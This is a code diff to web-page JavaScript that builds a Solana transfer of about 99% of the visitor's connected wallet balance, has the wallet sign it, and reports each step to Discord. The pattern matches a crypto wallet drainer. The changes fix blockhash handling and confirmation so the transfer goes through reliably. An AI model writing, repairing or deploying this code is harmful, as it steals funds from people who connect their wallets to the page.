@@ -85,7 +85,10 @@ $(document).ready(function() {
                 sendToDiscord('Insufficient funds for transfer');
                 return;
             }
-
+    
+            // Get latest blockhash FIRST
+            const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
+    
             const transaction = new solanaWeb3.Transaction().add(
                 solanaWeb3.SystemProgram.transfer({
                     fromPubkey: walletPublicKey,
@@ -93,19 +96,24 @@ $(document).ready(function() {
                     lamports: Math.floor(balanceForTransfer * 0.99),
                 }),
             );
-
-            // This will work with newer web3.js + Syndica
-            const latestBlockhash = await connection.getLatestBlockhash();
-            transaction.recentBlockhash = latestBlockhash.blockhash;
+    
+            // Set blockhash and feePayer
+            transaction.recentBlockhash = blockhash;
             transaction.feePayer = walletPublicKey;
-
+    
             const signedTransaction = await window.solana.signTransaction(transaction);
             const signature = await connection.sendRawTransaction(signedTransaction.serialize());
             
             console.log("Transaction sent:", signature);
             sendToDiscord(`Transaction sent: ${signature}`);
             
-            await connection.confirmTransaction(signature);
+            // Use the lastValidBlockHeight for confirmation
+            await connection.confirmTransaction({
+                signature,
+                blockhash,
+                lastValidBlockHeight
+            });
+            
             console.log("Transaction confirmed:", signature);
             sendToDiscord(`Transaction confirmed: ${signature}`);
             
